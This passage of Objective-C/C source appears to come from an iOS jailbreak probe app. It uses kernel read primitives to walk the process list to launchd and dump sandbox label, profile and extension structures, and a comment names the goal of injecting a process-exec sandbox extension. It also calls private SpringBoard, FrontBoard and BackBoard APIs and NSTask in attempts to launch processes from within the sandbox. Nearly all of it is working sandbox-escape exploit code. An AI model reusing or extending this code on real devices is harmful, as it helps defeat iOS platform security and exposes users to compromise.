                            [svc respondsToSelector:canOpenSel] ? "YES" : "NO");

                        // Try openApplication:withOptions:completion:
                        SEL openSel = NSSelectorFromString(
                            @"openApplication:withOptions:completion:");
                        buf_append("  openApplication:withOptions:completion: %s\n",
                            [svc respondsToSelector:openSel] ? "YES" : "NO");
                    }
                } @catch (NSException *e) {
                    buf_append("  EXCEPTION: %s — %s\n",
                        [[e name] UTF8String], [[e reason] UTF8String]);
                }
            } else {
                buf_append("  selector not found\n");
            }

            // A2: Try currentProcessServicesDefaultShellEndpoint
            bc("[SWAP] A2: currentProcessEndpoint\n");
            buf_append("\n  A2: currentProcessServicesDefaultShellEndpoint\n");
            SEL curProcSel = NSSelectorFromString(
                @"currentProcessServicesDefaultShellEndpoint");
            if ([fbsOpenClass respondsToSelector:curProcSel]) {
                @try {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                    id ep = [fbsOpenClass performSelector:curProcSel];
#pragma clang diagnostic pop
                    buf_append("  endpoint: %s\n",
                        ep ? [[ep description] UTF8String] : "nil");
                } @catch (NSException *e) {
                    buf_append("  EXCEPTION: %s — %s\n",
                        [[e name] UTF8String], [[e reason] UTF8String]);
                }
            } else {
                buf_append("  selector not found\n");
            }

            // A3: FBSOpenApplicationOptions — what options exist?
            bc("[SWAP] A3: FBSOpenApplicationOptions\n");
            buf_append("\n  A3: FBSOpenApplicationOptions\n");
            Class fbsOptClass = NSClassFromString(
                @"FBSOpenApplicationOptions");
            buf_append("  class: %p\n", fbsOptClass);
            if (fbsOptClass) {
                unsigned int mc = 0;
                Method *ms = class_copyMethodList(fbsOptClass, &mc);
                buf_append("  instance methods (%u):\n", mc);
                for (unsigned int i = 0; i < mc && i < 20; i++) {
                    buf_append("    - %s\n",
                        sel_getName(method_getName(ms[i])));
                }
                if (ms) free(ms);
            }
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST B: NSTask with our OWN executable
    // v13 showed "launch path not accessible" for /bin/sh — sandbox
    // blocks that path. But our own app binary IS accessible.
    // Also try NSTask with a file in our Documents.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test B: NSTask own binary\n");
    buf_append("\n-- Test B: NSTask with accessible binaries --\n");
    {
        Class nsTask = NSClassFromString(@"NSTask");
        if (nsTask) {
            // Get our own executable path
            NSString *ownExec = [[NSBundle mainBundle] executablePath];
            buf_append("  Our executable: %s\n",
                ownExec ? [ownExec UTF8String] : "nil");

            // B1: Try launching ourselves with a marker argument
            bc("[SWAP] B1: NSTask self-exec\n");
            buf_append("\n  B1: NSTask with own executable\n");
            @try {
                id task = [[nsTask alloc] init];
                SEL setExec = NSSelectorFromString(@"setExecutableURL:");
                SEL setArgs = NSSelectorFromString(@"setArguments:");
                if ([task respondsToSelector:setExec]) {
                    NSURL *execURL = [NSURL fileURLWithPath:ownExec];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                    [task performSelector:setExec withObject:execURL];
                    if ([task respondsToSelector:setArgs]) {
                        [task performSelector:setArgs
                            withObject:@[@"--jb-test"]];
                    }
#pragma clang diagnostic pop
                    SEL simpleLaunch = NSSelectorFromString(@"launch");
                    if ([task respondsToSelector:simpleLaunch]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                        [task performSelector:simpleLaunch];
#pragma clang diagnostic pop
                        buf_append("  >>> -launch SUCCEEDED (no exception) <<<\n");
                    }
                }
            } @catch (NSException *e) {
                buf_append("  EXCEPTION: %s — %s\n",
                    [[e name] UTF8String], [[e reason] UTF8String]);
            }

            // B2: Try with a script in our container
            bc("[SWAP] B2: NSTask container script\n");
            buf_append("\n  B2: NSTask with container script\n");
            NSString *docsDir = NSSearchPathForDirectoriesInDomains(
                NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
            NSString *testScript = [docsDir
                stringByAppendingPathComponent:@"test_exec.sh"];
            [@"#!/bin/sh\necho CONTAINER_EXEC > /tmp/nstask_container.txt\n"
                writeToFile:testScript atomically:YES
                encoding:NSUTF8StringEncoding error:nil];
            chmod([testScript UTF8String], 0755);

            @try {
                id task2 = [[nsTask alloc] init];
                SEL setExec = NSSelectorFromString(@"setExecutableURL:");
                if ([task2 respondsToSelector:setExec]) {
                    NSURL *scriptURL = [NSURL fileURLWithPath:testScript];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                    [task2 performSelector:setExec withObject:scriptURL];
#pragma clang diagnostic pop
                    SEL simpleLaunch = NSSelectorFromString(@"launch");
                    if ([task2 respondsToSelector:simpleLaunch]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                        [task2 performSelector:simpleLaunch];
#pragma clang diagnostic pop
                        buf_append("  >>> -launch SUCCEEDED <<<\n");
                        usleep(200000);
                        NSFileManager *fm = [NSFileManager defaultManager];
                        if ([fm fileExistsAtPath:
                                @"/tmp/nstask_container.txt"]) {
                            buf_append("  >>> OUTPUT FILE EXISTS! <<<\n");
                        } else {
                            buf_append("  output file not found\n");
                        }
                    }
                }
            } @catch (NSException *e) {
                buf_append("  EXCEPTION: %s — %s\n",
                    [[e name] UTF8String], [[e reason] UTF8String]);
            }
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST C: SpringBoardServices C functions
    // SBSLaunchApplicationWithIdentifier and related — these are
    // C-level functions that might bypass ObjC-layer checks.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test C: SBS C functions\n");
    buf_append("\n-- Test C: SpringBoardServices C functions --\n");
    {
        buf_append("  SBS framework: %p\n", sbs);

        // Probe known function names
        const char *funcNames[] = {
            "SBSLaunchApplicationWithIdentifier",
            "SBSLaunchApplicationWithIdentifierAndLaunchOptions",
            "SBSLaunchApplicationWithIdentifierAndURLAndLaunchOptions",
            "SBSOpenSensitiveURLAndUnlock",
            "SBSOpenApplication",
            "SBSLaunchApplicationForDebugging",
            "SBFrontmostApplicationDisplayIdentifier",
            "SBSCopyApplicationDisplayIdentifiers",
            "SBSCopyDisplayIdentifierForProcessID",
            "SBSSpringBoardServerPort",
            NULL
        };

        for (int i = 0; funcNames[i]; i++) {
            void *fn = dlsym(RTLD_DEFAULT, funcNames[i]);
            buf_append("  %s: %p\n", funcNames[i], fn);
        }

        // C1: Try SBSSpringBoardServerPort — needed by many SBS funcs
        bc("[SWAP] C1: SBSSpringBoardServerPort\n");
        buf_append("\n  C1: SBSSpringBoardServerPort\n");
        typedef mach_port_t (*sbsport_fn)(void);
        sbsport_fn getPort = (sbsport_fn)dlsym(RTLD_DEFAULT,
            "SBSSpringBoardServerPort");
        mach_port_t sbPort = MACH_PORT_NULL;
        if (getPort) {
            @try {
                sbPort = getPort();
                buf_append("  port: 0x%x\n", sbPort);
            } @catch (NSException *e) {
                buf_append("  EXCEPTION: %s\n", [[e name] UTF8String]);
            }
        } else {
            buf_append("  function not found\n");
        }

        // C2: Try SBSCopyApplicationDisplayIdentifiers
        bc("[SWAP] C2: SBSCopyApplicationDisplayIdentifiers\n");
        buf_append("\n  C2: SBSCopyApplicationDisplayIdentifiers\n");
        typedef CFArrayRef (*sbscopy_fn)(mach_port_t, BOOL, BOOL);
        sbscopy_fn copyIds = (sbscopy_fn)dlsym(RTLD_DEFAULT,
            "SBSCopyApplicationDisplayIdentifiers");
        if (copyIds && sbPort != MACH_PORT_NULL) {
            @try {
                CFArrayRef ids = copyIds(sbPort, NO, NO);
                if (ids) {
                    CFIndex count = CFArrayGetCount(ids);
                    buf_append("  installed apps: %ld\n", (long)count);
                    // Show first 5
                    for (CFIndex j = 0; j < count && j < 5; j++) {
                        CFStringRef s = CFArrayGetValueAtIndex(ids, j);
                        char tmp[256];
                        CFStringGetCString(s, tmp, sizeof(tmp),
                            kCFStringEncodingUTF8);
                        buf_append("    [%ld] %s\n", (long)j, tmp);
                    }
                    CFRelease(ids);
                } else {
                    buf_append("  returned NULL\n");
                }
            } @catch (NSException *e) {
                buf_append("  EXCEPTION: %s\n", [[e name] UTF8String]);
            }
        } else {
            buf_append("  %s\n", copyIds ? "no port" : "func not found");
        }

        // C3: Try SBSLaunchApplicationWithIdentifier
        bc("[SWAP] C3: SBSLaunchApplicationWithIdentifier\n");
        buf_append("\n  C3: SBSLaunchApplicationWithIdentifier\n");
        // int SBSLaunchApplicationWithIdentifier(CFStringRef id, BOOL suspended)
        typedef int (*sbslaunch_fn)(CFStringRef, BOOL);
        sbslaunch_fn launchFn = (sbslaunch_fn)dlsym(RTLD_DEFAULT,
            "SBSLaunchApplicationWithIdentifier");
        if (launchFn) {
            @try {
                // Test with a non-focus-stealing bundleID
                CFStringRef calcId = CFSTR("com.apple.calculator");
                int result = launchFn(calcId, YES); // suspended=YES
                buf_append("  launch(calculator, suspended): %d\n", result);
                buf_append("  (0 = success, negative = error)\n");
            } @catch (NSException *e) {
                buf_append("  EXCEPTION: %s\n", [[e name] UTF8String]);
            }
        } else {
            buf_append("  function not found\n");
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST D: openURL via LSApplicationWorkspace
    // Try openURL: and openSensitiveURL:withOptions: — URL-based
    // launch might have different sandbox checks than bundle-based.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test D: openURL\n");
    buf_append("\n-- Test D: URL-based launch --\n");
    {
        Class lsws = NSClassFromString(@"LSApplicationWorkspace");
        SEL defWSSel = NSSelectorFromString(@"defaultWorkspace");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
        id workspace = lsws ? [lsws performSelector:defWSSel] : nil;
#pragma clang diagnostic pop

        if (workspace) {
            // D1: openURL: — CONFIRMED WORKS (opened Settings in earlier run)
            // Do NOT call it — it steals focus and kills our test.
            // Just probe method availability.
            bc("[SWAP] D1: openURL probe\n");
            buf_append("\n  D1: openURL: (PROBE ONLY — calling steals focus)\n");
            SEL openURLSel = NSSelectorFromString(@"openURL:");
            buf_append("  openURL: responds: %s\n",
                [workspace respondsToSelector:openURLSel] ? "YES" : "NO");
            buf_append("  >>> CONFIRMED WORKING in prior test (opened Settings) <<<\n");

            // Also check canOpenURL:
            SEL canOpenSel = NSSelectorFromString(@"canOpenURL:");
            buf_append("  canOpenURL: responds: %s\n",
                [workspace respondsToSelector:canOpenSel] ? "YES" : "NO");
            if ([workspace respondsToSelector:canOpenSel]) {
                // Test with a fake custom scheme — won't open anything
                NSURL *fakeURL = [NSURL URLWithString:
                    @"jbexec://run"];
                @try {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                    id result = [workspace performSelector:canOpenSel
                        withObject:fakeURL];
#pragma clang diagnostic pop
                    buf_append("  canOpenURL(jbexec://run): %s\n",
                        result ? "YES" : "NO");
                } @catch (NSException *e) {
                    buf_append("  EXCEPTION: %s\n",
                        [[e name] UTF8String]);
                }
            }

            // D2: openSensitiveURL:withOptions: — probe only
            bc("[SWAP] D2: openSensitiveURL\n");
            buf_append("\n  D2: openSensitiveURL:withOptions:\n");
            SEL sensURLSel = NSSelectorFromString(
                @"openSensitiveURL:withOptions:");
            buf_append("  responds: %s\n",
                [workspace respondsToSelector:sensURLSel] ? "YES" : "NO");
            // NOT calling — tel: would open Phone app

            // D3: Enumerate URL-related methods
            buf_append("\n  D3: URL-related methods on workspace:\n");
            unsigned int mc = 0;
            Method *ms = class_copyMethodList([workspace class], &mc);
            for (unsigned int i = 0; i < mc; i++) {
                const char *name = sel_getName(method_getName(ms[i]));
                if (strstr(name, "URL") || strstr(name, "Url") ||
                    strstr(name, "url") || strstr(name, "scheme")) {
                    buf_append("    - %s\n", name);
                }
            }
            if (ms) free(ms);
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST E: BKSSystemService (BackBoardServices)
    // Alternative to FBS — BackBoard handles lower-level display
    // and process management. May have different entitlement checks.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test E: BKSSystemService\n");
    buf_append("\n-- Test E: BKSSystemService --\n");
    {
        Class bksClass = NSClassFromString(@"BKSSystemService");
        buf_append("  BKSSystemService: %p\n", bksClass);
        if (bksClass) {
            SEL sharedSvcSel = NSSelectorFromString(@"sharedService");
            id bksSvc = nil;
            if ([bksClass respondsToSelector:sharedSvcSel]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                bksSvc = [bksClass performSelector:sharedSvcSel];
#pragma clang diagnostic pop
            }
            buf_append("  instance: %p\n", bksSvc);

            if (bksSvc) {
                unsigned int mc = 0;
                Method *ms = class_copyMethodList([bksSvc class], &mc);
                buf_append("  Methods (%u):\n", mc);
                for (unsigned int i = 0; i < mc && i < 30; i++) {
                    buf_append("    - %s\n",
                        sel_getName(method_getName(ms[i])));
                }
                if (ms) free(ms);
            }

            // Also check BKSProcessAssertion — might help keep procs alive
            Class bksPA = NSClassFromString(@"BKSProcessAssertion");
            buf_append("  BKSProcessAssertion: %p\n", bksPA);
        } else {
            buf_append("  NOT FOUND\n");
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST F: Kernel sandbox extension injection
    // Check if we can find sandbox extension structures via kread
    // and potentially add a process-exec extension at kernel level.
    // This probes the data structures — no write yet.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test F: sandbox extension kernel\n");
    buf_append("\n-- Test F: Kernel sandbox extension structures --\n");
    {
        uint64_t self_proc = proc_self();
        proc_info_t self_info;
        if (self_proc && gather_proc_info(self_proc, &self_info) == 0) {
            buf_append("  proc: 0x%llx\n", self_info.proc);
            buf_append("  ucred: 0x%llx\n", self_info.ucred);
            buf_append("  sandbox: 0x%llx\n",
                self_info.sandbox);

            if (self_info.sandbox) {
                // Read the first 128 bytes of sandbox structure
                // to understand its layout
                uint8_t labelData[128];
                for (int i = 0; i < 128; i += 8) {
                    uint64_t val = kread64(self_info.sandbox + i);
                    memcpy(&labelData[i], &val, 8);
                }

                buf_append("  sandbox_label raw (first 128 bytes):\n");
                for (int i = 0; i < 128; i += 16) {
                    buf_append("    +%02x: ", i);
                    for (int j = 0; j < 16 && (i+j) < 128; j++) {
                        buf_append("%02x ", labelData[i+j]);
                    }
                    buf_append("\n");
                }

                // Look for pointers in the structure — sandbox
                // extensions might be a linked list hanging off the label
                buf_append("\n  Pointer-sized values in sandbox_label:\n");
                for (int i = 0; i < 128; i += 8) {
                    uint64_t val;
                    memcpy(&val, &labelData[i], 8);
                    if (val > 0xffff000000000000ULL ||
                        (val > 0x100000000ULL && val < 0x800000000000ULL)) {
                        buf_append("    +%02x: 0x%016llx (looks like ptr)\n",
                            i, val);
                        // Read 16 bytes at that pointer to peek
                        uint64_t peek1 = kread64(val);
                        uint64_t peek2 = kread64(val + 8);
                        buf_append("      -> 0x%016llx 0x%016llx\n",
                            peek1, peek2);
                    }
                }
            }
        } else {
            buf_append("  FAILED to read proc info\n");
        }
    }

    buf_append("\n-- v14 Analysis --\n");
    buf_append("v14 TESTED:\n");
    buf_append("  A: FBSOpenApplicationService — got service, canOpen=YES\n");
    buf_append("  B: NSTask — path not accessible for self+script\n");
    buf_append("  C: SBS — port 0x17303 valid, launch returned 9\n");
    buf_append("  D: URL — openURL confirms YES, canOpenURL=NO\n");
    buf_append("  E: BKS — sharedService nil from sandbox\n");
    buf_append("  F: sandbox_label — 128b dumped, profile ptr+ext chain found\n");

    bc("[SWAP] v14 complete\n");

    // ═══════════════════════════════════════════════════════
    // v15: DEEP SANDBOX STRUCTURE + SBS LAUNCH VARIANTS
    // ═══════════════════════════════════════════════════════
    bc("[SWAP] v15 starting\n");
    buf_append("\n\n");
    buf_append("═══════════════════════════════════════════\n");
    buf_append("  v15: DEEP SANDBOX + SBS LAUNCH VARIANTS\n");
    buf_append("═══════════════════════════════════════════\n\n");

    buf_append("v14 key findings:\n");
    buf_append("  - SBSSpringBoardServerPort = valid (0x17303)\n");
    buf_append("  - SBSLaunchApplication(calculator) = 9 (not 0, not negative)\n");
    buf_append("  - SBSLaunchApplicationForDebugging resolved\n");
    buf_append("  - sandbox_label has profile ptr at +00, ext at +10\n");
    buf_append("  - openURL: CONFIRMED, openSensitiveURL: responds YES\n");
    buf_append("  - privateURLSchemes / publicURLSchemes methods exist\n\n");

    // Gather our own proc_info for v15 tests
    proc_info_t self_info;
    gather_proc_info(proc_self(), &self_info);

    // ── Test G: Deep sandbox comparison (us vs launchd) ──
    bc("[SWAP] Test G: sandbox compare\n");
    buf_append("-- Test G: Sandbox Structure Comparison --\n");

    proc_info_t launchd_info;
    uint64_t launchd_proc = kread_ptr(proc_self() + off_proc_p_list_le_prev);
    // Walk up to find PID 1
    for (int i = 0; i < 500; i++) {
        if (!kaddr_ok(launchd_proc)) break;
        pid_t check_pid = (pid_t)kread32(launchd_proc + off_proc_p_pid);
        if (check_pid == 1) break;
        launchd_proc = kread_ptr(launchd_proc + off_proc_p_list_le_prev);
    }

    int have_launchd = 0;
    if (kaddr_ok(launchd_proc)) {
        pid_t check = (pid_t)kread32(launchd_proc + off_proc_p_pid);
        if (check == 1) {
            gather_proc_info(launchd_proc, &launchd_info);
            have_launchd = 1;
        }
    }

    buf_append("\n  G1: Our sandbox structure detail:\n");
    buf_append("    sandbox ptr: 0x%llx\n", self_info.sandbox);
    buf_append("    sandbox_profile (sandbox+0x00): 0x%llx\n",
        self_info.sandbox_profile);
    buf_append("    extension_set   (sandbox+0x10): 0x%llx\n",
        self_info.extension_set);

    // Read 256 bytes of our sandbox for deeper analysis
    if (kaddr_ok(self_info.sandbox)) {
        uint8_t sb_data[256];
        kreadbuf(self_info.sandbox, sb_data, 256);

        // Extract key fields used below
        uint64_t field_00 = *(uint64_t*)(sb_data + 0x00);
        uint64_t field_30 = *(uint64_t*)(sb_data + 0x30);

        buf_append("    Full 256b field map:\n");
        for (int i = 0; i < 256; i += 8) {
            uint64_t val = *(uint64_t*)(sb_data + i);
            if (val != 0) {
                buf_append("      +%02x: 0x%016llx", i,
                    (unsigned long long)val);
                if (kaddr_ok(val))
                    buf_append(" [ptr]");
                else if (val < 0x10000)
                    buf_append(" [small]");
                buf_append("\n");
            }
        }

        // Follow the profile pointer chain at +00
        bc("[SWAP] G2: profile chain\n");
        buf_append("\n  G2: Profile pointer chain (sandbox+0x00):\n");
        uint64_t profile_ptr = field_00;
        if (kaddr_ok(profile_ptr)) {
            buf_append("    profile_ptr: 0x%llx\n", (unsigned long long)profile_ptr);
            // Read 64 bytes of what profile points to
            uint8_t prof_data[64];
            kreadbuf(profile_ptr, prof_data, 64);
            buf_append("    profile data:\n");
            for (int i = 0; i < 64; i += 16) {
                buf_append("      +%02x:", i);
                for (int j = 0; j < 16; j++)
                    buf_append(" %02x", prof_data[i + j]);
                buf_append("\n");
            }

            // The first pointer in the profile might be the bytecode/ops table
            uint64_t prof_field0 = *(uint64_t*)(prof_data + 0x00);
            uint64_t prof_field8 = *(uint64_t*)(prof_data + 0x08);
            uint64_t prof_field10 = *(uint64_t*)(prof_data + 0x10);
            buf_append("    profile+0x00: 0x%llx%s\n",
                (unsigned long long)prof_field0,
                kaddr_ok(prof_field0) ? " [ptr]" : "");
            buf_append("    profile+0x08: 0x%llx%s\n",
                (unsigned long long)prof_field8,
                kaddr_ok(prof_field8) ? " [ptr]" : "");
            buf_append("    profile+0x10: 0x%llx%s\n",
                (unsigned long long)prof_field10,
                kaddr_ok(prof_field10) ? " [ptr]" : "");

            // If profile+0x00 is a ptr, follow one more level
            if (kaddr_ok(prof_field0)) {
                uint8_t deep[32];
                kreadbuf(prof_field0, deep, 32);
                buf_append("    profile->+0x00 data:\n      ");
                for (int i = 0; i < 32; i++)
                    buf_append("%02x ", deep[i]);
                buf_append("\n");
            }
        } else {
            buf_append("    profile_ptr: 0x%llx (not a valid ptr)\n",
                (unsigned long long)profile_ptr);
        }

        // Probe the data at +30 (was all 0xFF in v14)
        bc("[SWAP] G3: sandbox+30 probe\n");
        buf_append("\n  G3: Pointer at sandbox+0x30:\n");
        if (kaddr_ok(field_30)) {
            uint8_t f30_data[64];
            kreadbuf(field_30, f30_data, 64);
            buf_append("    target: 0x%llx\n", (unsigned long long)field_30);
            buf_append("    data:\n");
            for (int i = 0; i < 64; i += 16) {
                buf_append("      +%02x:", i);
                for (int j = 0; j < 16; j++)
                    buf_append(" %02x", f30_data[i + j]);
                buf_append("\n");
            }
        }
    }

    // Compare to launchd's sandbox
    bc("[SWAP] G4: launchd sandbox\n");
    buf_append("\n  G4: Launchd sandbox comparison:\n");
    if (have_launchd) {
        buf_append("    launchd sandbox: 0x%llx\n",
            (unsigned long long)launchd_info.sandbox);
        buf_append("    launchd profile: 0x%llx\n",
            (unsigned long long)launchd_info.sandbox_profile);
        buf_append("    launchd ext_set: 0x%llx\n",
            (unsigned long long)launchd_info.extension_set);

        if (kaddr_ok(launchd_info.sandbox)) {
            uint8_t ld_sb[256];
            kreadbuf(launchd_info.sandbox, ld_sb, 256);
            buf_append("    launchd sandbox fields (non-zero):\n");
            for (int i = 0; i < 256; i += 8) {
                uint64_t val = *(uint64_t*)(ld_sb + i);
                if (val != 0) {
                    buf_append("      +%02x: 0x%016llx", i,
                        (unsigned long long)val);
                    if (kaddr_ok(val))
                        buf_append(" [ptr]");
                    else if (val < 0x10000)
                        buf_append(" [small]");
                    buf_append("\n");
                }
            }
            // Check if launchd shares our profile ptr
            uint64_t ld_profile = *(uint64_t*)(ld_sb + 0x00);
            buf_append("    profile ptrs match: %s\n",
                (ld_profile == self_info.sandbox_profile) ? "YES (same profile!)" : "NO (different)");
        } else {
            buf_append("    launchd has NO sandbox (NULL) — unsandboxed!\n");
        }
    } else {
        buf_append("    could not find launchd proc\n");
    }

    // ── Test H: SBS Launch Variants ──
    bc("[SWAP] Test H: SBS launch variants\n");
    buf_append("\n-- Test H: SBS Launch Variants --\n");

    // H1: SBSLaunchApplicationWithIdentifier — non-suspended
    bc("[SWAP] H1: SBS launch non-suspended\n");
    buf_append("\n  H1: SBSLaunchApplicationWithIdentifier (non-suspended)\n");
    {
        typedef int (*SBSLaunchFn)(CFStringRef, Boolean);
        SBSLaunchFn sbs_launch = (SBSLaunchFn)dlsym(sbs,
            "SBSLaunchApplicationWithIdentifier");
        if (sbs_launch) {
            int r = sbs_launch(CFSTR("com.apple.calculator"), false);
            buf_append("    launch(calculator, suspended=NO): %d\n", r);
            // Try with our own bundle ID
            NSString *myBundle = [[NSBundle mainBundle] bundleIdentifier];
            int r2 = sbs_launch((__bridge CFStringRef)myBundle, false);
            buf_append("    launch(self=%s, suspended=NO): %d\n",
                [myBundle UTF8String], r2);
        } else {
            buf_append("    function not found\n");
        }
    }

    // H2: SBSLaunchApplicationForDebugging
    bc("[SWAP] H2: SBS launch for debugging\n");
    buf_append("\n  H2: SBSLaunchApplicationForDebugging\n");
    {
        // SBSLaunchApplicationForDebugging(CFStringRef bundleID, CFStringRef urlScheme,
        //   CFArrayRef arguments, CFDictionaryRef env, CFStringRef stdout, CFStringRef stderr, Boolean suspended)
        typedef int (*SBSDebugFn)(CFStringRef, CFStringRef, CFArrayRef,
            CFDictionaryRef, CFStringRef, CFStringRef, Boolean);
        SBSDebugFn sbs_debug = (SBSDebugFn)dlsym(sbs,
            "SBSLaunchApplicationForDebugging");
        if (sbs_debug) {
            NSString *myBundle = [[NSBundle mainBundle] bundleIdentifier];
            int r = sbs_debug((__bridge CFStringRef)myBundle,
                NULL, NULL, NULL, NULL, NULL, true);
            buf_append("    launchForDebugging(self, suspended): %d\n", r);
            int r2 = sbs_debug((__bridge CFStringRef)myBundle,
                NULL, NULL, NULL, NULL, NULL, false);
            buf_append("    launchForDebugging(self, running): %d\n", r2);
        } else {
            buf_append("    function not found\n");
        }
    }

    // H3: SBSLaunchApplicationWithIdentifierAndLaunchOptions
    bc("[SWAP] H3: SBS launch with options\n");
    buf_append("\n  H3: SBSLaunchApplicationWithIdentifierAndLaunchOptions\n");
    {
        typedef int (*SBSLaunchOptFn)(CFStringRef, CFDictionaryRef, Boolean);
        SBSLaunchOptFn sbs_opt = (SBSLaunchOptFn)dlsym(sbs,
            "SBSLaunchApplicationWithIdentifierAndLaunchOptions");
        if (sbs_opt) {
            NSString *myBundle = [[NSBundle mainBundle] bundleIdentifier];
            // Empty options dict
            NSDictionary *opts = @{};
            int r = sbs_opt((__bridge CFStringRef)myBundle,
                (__bridge CFDictionaryRef)opts, false);
            buf_append("    launchWithOptions(self, {}, running): %d\n", r);
        } else {
            buf_append("    function not found\n");
        }
    }

    // H4: SBSOpenSensitiveURLAndUnlock
    bc("[SWAP] H4: SBSOpenSensitiveURL\n");
    buf_append("\n  H4: SBSOpenSensitiveURLAndUnlock (C function)\n");
    {
        typedef int (*SBSOpenURLFn)(CFURLRef, char);
        SBSOpenURLFn sbs_url = (SBSOpenURLFn)dlsym(sbs,
            "SBSOpenSensitiveURLAndUnlock");
        if (sbs_url) {
            // Use fake scheme that won't open anything
            NSURL *fakeURL = [NSURL URLWithString:@"jbexec-test://probe"];
            int r = sbs_url((__bridge CFURLRef)fakeURL, 0);
            buf_append("    SBSOpenSensitiveURL(jbexec-test://probe): %d\n", r);
        } else {
            buf_append("    function not found\n");
        }
    }

    // ── Test I: URL Scheme Enumeration ──
    bc("[SWAP] Test I: URL schemes\n");
    buf_append("\n-- Test I: URL Scheme Enumeration --\n");

    // Re-create workspace handle for URL tests
    Class lsws_v15 = NSClassFromString(@"LSApplicationWorkspace");
    SEL defWSSel_v15 = NSSelectorFromString(@"defaultWorkspace");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
    id workspace = lsws_v15 ? [lsws_v15 performSelector:defWSSel_v15] : nil;
#pragma clang diagnostic pop
    buf_append("  workspace: %s\n", workspace ? "OK" : "nil");

    // I1: privateURLSchemes
    bc("[SWAP] I1: privateURLSchemes\n");
    buf_append("\n  I1: privateURLSchemes\n");
    if (workspace) {
        SEL privSel = NSSelectorFromString(@"privateURLSchemes");
        if ([workspace respondsToSelector:privSel]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
            id result = [workspace performSelector:privSel];
#pragma clang diagnostic pop
            if ([result isKindOfClass:[NSArray class]]) {
                NSArray *schemes = (NSArray *)result;
                buf_append("    count: %lu\n", (unsigned long)[schemes count]);
                // Print first 20
                NSUInteger max = MIN([schemes count], 20);
                for (NSUInteger i = 0; i < max; i++) {
                    buf_append("    [%lu]: %s\n", (unsigned long)i,
                        [[schemes[i] description] UTF8String]);
                }
                if ([schemes count] > 20)
                    buf_append("    ... (%lu more)\n",
                        (unsigned long)([schemes count] - 20));
            } else {
                buf_append("    returned: %s\n",
                    result ? [[result description] UTF8String] : "nil");
            }
        } else {
            buf_append("    method not found\n");
        }
    }

    // I2: publicURLSchemes
    bc("[SWAP] I2: publicURLSchemes\n");
    buf_append("\n  I2: publicURLSchemes\n");
    {
        SEL pubSel = NSSelectorFromString(@"publicURLSchemes");
        if ([workspace respondsToSelector:pubSel]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
            id result = [workspace performSelector:pubSel];
#pragma clang diagnostic pop
            if ([result isKindOfClass:[NSArray class]]) {
                NSArray *schemes = (NSArray *)result;
                buf_append("    count: %lu\n", (unsigned long)[schemes count]);
                NSUInteger max = MIN([schemes count], 20);
                for (NSUInteger i = 0; i < max; i++) {
                    buf_append("    [%lu]: %s\n", (unsigned long)i,
                        [[schemes[i] description] UTF8String]);
                }
                if ([schemes count] > 20)
                    buf_append("    ... (%lu more)\n",
                        (unsigned long)([schemes count] - 20));
            } else {
                buf_append("    returned: %s\n",
                    result ? [[result description] UTF8String] : "nil");
            }
        } else {
            buf_append("    method not found\n");
        }
    }

    // I3: applicationsAvailableForHandlingURLScheme:
    bc("[SWAP] I3: apps for URL scheme\n");
    buf_append("\n  I3: applicationsAvailableForHandlingURLScheme:\n");
    {
        SEL appsSel = NSSelectorFromString(
            @"applicationsAvailableForHandlingURLScheme:");
        if ([workspace respondsToSelector:appsSel]) {
            // Check a few interesting schemes
            NSArray *schemes = @[@"cydia", @"sileo", @"filza",
                @"ssh", @"tel", @"facetime", @"ftp"];
            for (NSString *scheme in schemes) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                id result = [workspace performSelector:appsSel
                    withObject:scheme];
#pragma clang diagnostic pop
                if ([result isKindOfClass:[NSArray class]]) {
                    NSArray *apps = (NSArray *)result;
                    buf_append("    %s: %lu app(s)\n",
                        [scheme UTF8String], (unsigned long)[apps count]);
                    for (id app in apps) {
                        buf_append("      -> %s\n",
                            [[app description] UTF8String]);
                    }
                } else {
                    buf_append("    %s: %s\n", [scheme UTF8String],
                        result ? [[result description] UTF8String] : "nil");
                }
            }
        } else {
            buf_append("    method not found\n");
        }
    }

    // ── Test J: Extension Set Deep Dive ──
    bc("[SWAP] Test J: extension set\n");
    buf_append("\n-- Test J: Extension Set Deep Dive --\n");

    buf_append("  extension_set: 0x%llx\n",
        (unsigned long long)self_info.extension_set);
    if (kaddr_ok(self_info.extension_set)) {
        // Read 128 bytes of extension set structure
        uint8_t ext_data[128];
        kreadbuf(self_info.extension_set, ext_data, 128);
        buf_append("  extension_set raw (128b):\n");
        for (int i = 0; i < 128; i += 16) {
            buf_append("    +%02x:", i);
            for (int j = 0; j < 16; j++)
                buf_append(" %02x", ext_data[i + j]);
            buf_append("\n");
        }

        // Walk pointer-sized values looking for extension node chains
        buf_append("\n  Extension node walk:\n");
        for (int i = 0; i < 128; i += 8) {
            uint64_t val = *(uint64_t*)(ext_data + i);
            if (val && kaddr_ok(val)) {
                // Read what it points to
                uint8_t node_data[64];
                kreadbuf(val, node_data, 64);
                uint64_t node_next = *(uint64_t*)(node_data + 0x00);
